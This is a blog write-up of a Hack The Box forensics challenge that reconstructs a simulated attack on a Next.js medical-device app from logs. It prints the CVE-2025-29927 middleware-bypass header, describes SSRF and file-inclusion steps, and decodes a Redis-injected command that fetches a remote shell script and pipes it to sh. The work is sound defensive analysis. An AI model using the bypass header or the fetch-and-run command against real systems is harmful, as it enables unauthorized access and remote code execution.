+++
tags = ["linux", "sherlock", "DFIR", "forensics", "nextjs", "react", "CVE-2025-29927", "redis injection", "ssrf", "lfi", "redis"]
title = "NeuroSync-D HTB Sherlock Challenge: Investigating Next.js Middleware Bypass and Redis Injection"
description = "A detailed forensic analysis of a compromised medical BCI device infrastructure through Next.js middleware bypass (CVE-2025-29927). Learn how to analyze application logs to reconstruct attack timelines, identify SSRF and Redis injection techniques, and understand attacker lateral movement patterns."
keywords = "HTB, CTF, Linux, Linux administration"
draft = false
author = "bloodstiller"
date = 2025-05-11
toc = true
bold = true
next = true
+++

## NeuroSync-D Hack The Box Sherlock Challenge Writeup: {#neurosync-d-hack-the-box-sherlock-challenge-writeup}

-   <https://app.hackthebox.com/sherlocks/NeuroSync-D>


## Challenge Information: {#challenge-information}

-   **Difficulty**: Easy
-   **Category**: DFIR
-   **Scenario**: NeuroSync™ is a leading suite of products focusing on developing cutting edge medical BCI devices, designed by the Korosaki Coorporaton. Recently, an APT group targeted them and was able to infiltrate their infrastructure and is now moving laterally to compromise more systems. It appears that they have even managed to hijack a large number of online devices by exploiting an N-day vulnerability. Your task is to find out how they were able to compromise the infrastructure and understand how to secure it.


### Side Quest: What's an N-Day? {#side-quest-what-s-an-n-day}

An N-day is a vulnerability that is already publicly known however a patch may not be available or the user has not been able to patch the flaw just yet. This is common as rolling out updates to large organizations and networks can be a slow process.


## 1. Initial Analysis: {#1-dot-initial-analysis}


### Challenge Files: {#challenge-files}

-   **Files Provided**:

```log
├──  access.log
├──  bci-device.log
├──  data-api.log
├──  interface.log
└──  redis.log
```

Lets take a look at these files.


### 1. `interface.log` {#1-dot-interface-dot-log}

Looking at the file `interface.log` file we can see there is a an application called `neurosync@0.1.0 dev` &amp; it's a `Next.js` app. We can also see it's being run in development mode as the command `next dev` is used, naughty naughty.

```log
> neurosync@0.1.0 dev
> next dev

   ▲ Next.js 15.1.0
   - Local:        http://localhost:3000
   - Network:      http://172.17.0.2:3000
   - Experiments (use with caution):
     · webpackBuildWorker
     · parallelServerCompiles
     · parallelServerBuildTraces
```

We can also see the `Next.js` version is `15.1.0` and it's running on `localhost` &amp; port `3000`.


### 2. Discovering the Application is Vulnerable to CVE-2025-29927: {#2-dot-discovering-the-application-is-vulnerable-to-cve-2025-29927}

By searching the Next.js version we can see that this version is vulnerable to a middleware attack <https://nvd.nist.gov/vuln/detail/CVE-2025-29927>

Reading the description of the vulnerability we see the following:

> it is possible to bypass authorization checks within a Next.js application, if the authorization check occurs in middleware.


### 3. CVE-2025-29927 Explained: {#3-dot-cve-2025-29927-explained}

Luckily one of the vulnerability researchers, Rachid.A, created [this lovely blog post](https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware) detailing their process and the vulnerability. I will break it down here also, however I would recommend you read their post though as I will just give a high-level overview of the vulnerability, whereas there's goes into greater depth.


#### Side Quest: What is middleware?: {#side-quest-what-is-middleware}

Middleware acts as a checkpoint that runs before the application decides what information to serve a request. It will inspect the incoming request and then it will modify how the application responds, like redirecting, changing headers, cookie management or blocking/dropping a reqeuest plus many other things.

Here are some basic examples of how middleware can be used in real world scenarios:

-   **Auth check**:
    -   +For example+: A user tries to access an internal endpoint such as `/user/settings` the middleware will check for their session cookie and will then forward the request to the correct endpoint if permitted otherwise it may forward the request to `/login` if they aren't logged in.

-   **Locale detection**:
    -   Redirect users to a localized version of the site based on their browser's language.

-   **Feature flags**:
    -   Show different versions of a page depending on experimental settings (A/B testing).

-   **Rate limiting**:
    -   Block or throttle requests if too many come in from the same IP.


#### Next.js's middleware vulnerability: {#next-dot-js-s-middleware-vulnerability}

Next.js has it's own middleware &amp; I would recommend reading their [documentation](https://nextjs.org/docs/app/building-your-application/routing/middleware) to get a broader understanding of how it works; however, I will provide an explanation below of why it was (is) vulnerable.


##### The `runMiddleware` function flaw: {#the-runmiddleware-function-flaw}

The `runMiddleware` function checks the value of the `x-middleware-subrequest` header, which is expected to be a colon-separated list of middleware names (hence the `subreq.split(':')` operation below ). Based on this, it determines whether a particular middleware should be applied.

```js
// Check the value of the header
const subreq = params.request.headers[`x-middleware-subrequest`]
   //Splitting the header into a list.
   const subrequests = typeof subreq === 'string' ? subreq.split(':') : []
```

If the current middleware's name AKA `middlewareInfo.name` is already listed in `subrequests`, that means the middleware has already been invoked earlier in the request chain and **should be skipped**, and the request will be forwarded via the `NextResponse.next()` function and continue to the specified destination. (If you caught that you will know why that's interesting, however lets' carry on). If the `middleWareInfor.name` is not listed in the `subrequests` the middleware is executed via the `run()` function, and its response is handled accordingly.

```js
 if (subrequests.includes(middlewareInfo.name)) {
          result = {
            response: NextResponse.next(),
            waitUntil: Promise.resolve(),
          }
          continue
        }
```

This logic was likely implemented to avoid redundant middleware execution and reduce overhead during internal subrequests, ultimately improving performance. However, the issue is. **If an attacker can craft a request with the correct middleware name in the `x-middleware-subrequest` header, they can effectively bypass the middleware check**. The server assumes the middleware has already been run and responds with `NextResponse.next()`, forwarding the request to its intended destination without reapplying the middleware logic.

As Rachid.A/Zhero states in his post.

> The header and its value act as a universal key allowing rules to be overridden.


##### Determining where the "universal Key" is: {#determining-where-the-universal-key-is}

For this attack to work the `middlewareInfo.name` (the middleware name) has to be known, however, for all intents and purposes this is pretty easy to guess as the `middlewareInfo.name` = the path where the middleware is located.

According to the next.js [documentation](https://nextjs.org/docs/app/api-reference/file-conventions/src-folder) below.

> As an alternative to having the special Next.js \`app\` or \`pages\` directories in the root of your project, Next.js also supports the common pattern of placing application code under the \`src\` folder.
>
> &#x2026;&#x2026;..
>
> -   If you're using Middleware, ensure it is placed inside the \`src\` folder.

We can see that the middleware should be placed in the `src` folder. So the payload `~would~` could be.

```cfg
x-middleware-subrequest: src/middleware
```

However, according to the blogpost in later versions, the logic has changed slightly and the directory `src` may (not always) be omitted and the `subrequests` value (the header value once all values have been separated) must be greater then or equal to the predefined constant of (`5`) in the code.

What does that mean in English, I hear your cry. All it means is the following either our payload is this.

```cfg
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware

# Or our payload is this
x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware
```

Notice the amount of "middleware" entries is 5 which is equal to the hard-coded value of 5.

+Note+: I know this seems like superfluous information, however once we get into the logs having this understanding of the vulnerability logic will enable you to understand what is going on in greater depth.


### 4. Analyzing `interface.log` Further: {#4-dot-analyzing-interface-dot-log-further}

So now we know how the vulnerability works we can check if the `next.js` application is vulnerable.

If we look at lines 28 &amp; 29 of `interface.log` we can see that the `/middleware` folder which, unsurprisingly, contains the middleware was compiled, this would indicate it was accessed at this time as when in development mode `next.js` compiles routes, middleware, and components on-demand when first requested. This is to support hot reloading, faster startup, and incremental updates.

```log
 ○ Compiling /middleware ...
 ✓ Compiled /middleware in 1262ms (167 modules)
```

We see that it was compiled due to someone trying to access the `/api/bci/analytics` endpoint. The lines are long so I will post a breakdown underneath so they are more legible.

```cfg
2025-04-01T11:37:58.163Z - 10.129.231.211 - GET - http://localhost:3000/api/bci/analytics
```

-   `10.129.231.211`: This is the IP of the client making the request.
-   `localhost:3000`: This is the address the app is listening on internally inside the container or host environment (e.g., in a Docker container).
-   The request is going to the endpoint: `/api/bci/analytics`.

**Headers of Interest**:

```cfg
["host","10.129.231.215"],
["x-forwarded-for","10.129.231.211"],
["x-real-ip","10.129.231.211"],
["x-forwarded-host","10.129.231.215"],
["x-forwarded-port","3000"],
["x-middleware-subrequest","middleware"],
```

These headers tell us:

-   `host: 10.129.231.215`: This is the external IP/hostname the request was originally intended for before it was proxied to `localhost:3000`.
-   `x-forwarded-for: 10.129.231.211`: The actual IP of the originating client.
    -   +Important+: As we have been informed that APT is moving laterally this indicates they have compromised host `10.129.231.211` and are making their requests from it.
-   `x-real-ip: 10.129.231.211`: Same as above; often used for logging or app logic.
-   `x-forwarded-host` and `x-forwarded-port`: Show the external-facing host and port.
-   `x-middleware-subrequest","middleware"`: The middleware header.

+Note+:

-   There are other headers however these are the most important ones for this.
-   Each subsequent entry is the same however it just as an additional "middleware" argument in the header as all middleware routes were recursively compiled.
    -   Notes within notes:
        -   The "x-middleware-subrequest" header growing shows it's likely recursively calling itself, either via `NextResponse.rewrite()` or misconfigured proxy logic, happy to be corrected etc if I am wrong. bloodstiller@bloodstiller.com

Each subsequent line is just the requests made to the application e.g. PUT, GET etc.

Now the above may not seem like it tells us much, however it tells us that middleware was active for the endpoint `/api/bci/analytics` so we can start looking for IOC's in other logs by filtering for this endpoint.


### 5. Cross-referencing Middleware Compilation Time Against `access.log`: {#5-dot-cross-referencing-middleware-compilation-time-against-access-dot-log}

If we look at the `access.log` we can see a list of all requests made.

We see the attackers fuzzed for the `next.js` files `framework.js`, `main.js` &amp; `common.js` using the path `/_next/static/chunks`, however they received a `404` response. We can deduce this as the requests came from the compromised host `10.129.231.211`.

-   {{< figure src="/ox-hugo/2025-05-09-142525_.png" >}}

We can then see they were able to access the following resources:

-   `main-app.js` at `11:37:44`
-   `page.js` at `11:37:47`
    -   {{< figure src="/ox-hugo/2025-05-09-143408_.png" >}}

After which we see them access the `/api/bci/analytics` endpoint at `11:37:58`.

If we cross reference this time against the `interface.log` file we can see that the compilation of the middleware began at `11:37:58`. As mentioned before when in development mode middleware is compiled at execution time only, so we can safely assume this is the attackers.

-   {{< figure src="/ox-hugo/2025-05-09-143708_.png" >}}


### 6. Finding The Middleware Bypass Time By Way of CVE-2025-29927 Exploitation: {#6-dot-finding-the-middleware-bypass-time-by-way-of-cve-2025-29927-exploitation}

Looking at the `access.log` file we can also see the exact time the attackers bypassed the middleware by way of the vulnerable endpoint `/api/bci/analytics`. We can see that the previous attempts received a `401` GONE response however at `11:38:05` they received a `200` OK, signifying they successfully bypassed the middleware.

-   {{< figure src="/ox-hugo/2025-05-11-083407_.png" >}}

As we can see the previous attempts failed we can assume the payload below was the one successfully used to exploit this vulnerability:

```cfg
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```


### 7. SSRF Vulnerability &amp; Internal Bruteforce: {#7-dot-ssrf-vulnerability-and-internal-bruteforce}

We are informed of the following.

> The attacker chained the vulnerability with an SSRF attack, which allowed them to perform an internal port scan and discover an internal API.

Looking at the `data-api.log` file we can see further IOC's. The attacker is bruteforcing for endpoints on the internal API.

If we filter by using the following command we can see all the GET requests that come from local host `127.0.0.1`

```shell
cat data-api.log | grep 127 | grep GET | head
```

-   {{< figure src="/ox-hugo/2025-05-11-094736_.png" >}}


### 8. Discovering `/logs` Is Vulnerable to Local File Inclusion: {#8-dot-discovering-logs-is-vulnerable-to-local-file-inclusion}

We can see that eventually the attacker finds the endpoint `/logs` and they use to access `logs`.

-   {{< figure src="/ox-hugo/2025-05-11-095907_.png" >}}

They then perform a local file inclusion attack to read the `/etc/passwd` file.

-   {{< figure src="/ox-hugo/2025-05-11-100113_.png" >}}
-   +Note+: The reason `/etc/passwd` is used is because it's world readable so can be used as a good POC when testing for attacks like this.


### 9. Attacker Getting Access to `secret.key`: {#9-dot-attacker-getting-access-to-secret-dot-key}

Looking further at the `data-api.log` file we can see the attacker were able to access the file `secret.key` in the `/tmp` directory.

-   {{< figure src="/ox-hugo/2025-05-11-100452_.png" >}}

-   The `/tmp` directory:
    -   This directory is a standard location for storing temporary files, and its contents are cleared/deleted during system restarts.
-   `secret.key`:
    -   The filename suggests that the file contains sensitive piece of information potentially used for encryption, decryption, or authentication.

As there were no longer any further LFI attacks uses once the `secret.key` file was discovered at `11:39:24` we can assume the attackers were able to leverage this information to again move laterally or further into the system.


### 10. Redis Injection Attack: {#10-dot-redis-injection-attack}

Looking at the `redis.log`  we can see the below entry pushing to the redis db.

-   {{< figure src="/ox-hugo/2025-05-11-102618_.png" >}}

Let's break this down.


#### Analyzing the Redis Command Injection Payload: {#analyzing-the-redis-command-injection-payload}


##### The full Redis command observed is structured as follows: {#the-full-redis-command-observed-is-structured-as-follows}

```cfg
"RPUSH" "bci_commands" "OS_EXEC|d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo|f1f0c1feadb5abc79e700cac7ac63cccf91e818ecf693ad7073e3a448fa13bbb"
```

Here's a breakdown of each part:

-   `RPUSH bci_commands [payload]`
    This command pushes an entry into the Redis list named `bci_commands`. (It's likely that a backend system reads from this queue and executes the incoming jobs.)

-   The payload structure follows this format.

<!--listend-->

```shell
OS_EXEC|<base64_encoded_command>|<hash>
```

-   `OS_EXEC` indicates that the payload should be executed on the host operating system.
-   The second part is a Base64-encoded command.
-   The final part is a hash (possibly used for integrity verification or authorization, however that is purely a guess)


##### Decoding the Base64-Encoded Command: {#decoding-the-base64-encoded-command}

Let's extract and decode the Base64 portion of the payload.

```shell
echo d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo | base64 -d
```

This decodes to:

```shell
wget http://185.202.2.147/h4Pln4/run.sh -O- | sh
```

{{< figure src="/ox-hugo/2025-05-11-103556_.png" >}}

So this command downloads a remote shell script and pipes it directly into the shell, effectively executing arbitrary code on the system.


### 11. Correlating Time Stamps &amp; Discovering APT Server Location: {#11-dot-correlating-time-stamps-and-discovering-apt-server-location}


#### Time Stamp Correlation: {#time-stamp-correlation}

+Note+: This does not need to be done I am just doing it for comprehensiveness.
If  we correlate the above redis injection attack with the `bci-device.log` file we can see the payload in clear text.

```shell
2025-04-01 11:39:26 BCI (Device): Executing OS command: wget http://185.202.2.147/h4Pln4/run.sh -O- | sh
2025-04-01 11:39:26 BCI (Device): Command output: sh: 1: wget: not found
```

This took place at `11:39:26`. We can use <https://www.unixtimestamp.com/> to convert the timestamp in the `redis.log` file and it's at the same time (as expected)

-   {{< figure src="/ox-hugo/2025-05-11-105156_.png" >}}


#### Server Location: {#server-location}

If we check where this IP is located we can see it is located in Moskva, Russia.

-   {{< figure src="/ox-hugo/2025-05-11-090301_.png" >}}

+Note+: Searching for "h4Pln4" in Google yield no results.


## Lessons Learned: {#lessons-learned}


### What did I learn? {#what-did-i-learn}

1.  I actually learned alot about Node.js, I had some familiarity with it before but learned alot by reading the great article, which I will link again [here](https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware). I personally find I learn a huge amount when breaking down CVE's etc.
2.  It was fun to touch on redis injection as again this was something I was not hugely familiar with.


### What mistakes did I make? {#what-mistakes-did-i-make}

1.  Just copy and paste friends, the amount of mistakes I made trying re-type something.


## Sign off: {#sign-off}

Remember, folks as always: with great power comes great responsibility. Use this knowledge wisely, and always stay on the right side of the law!

Until next time, hack the planet!

&#x2013; Bloodstiller

&#x2013; Get in touch bloodstiller@bloodstiller.com
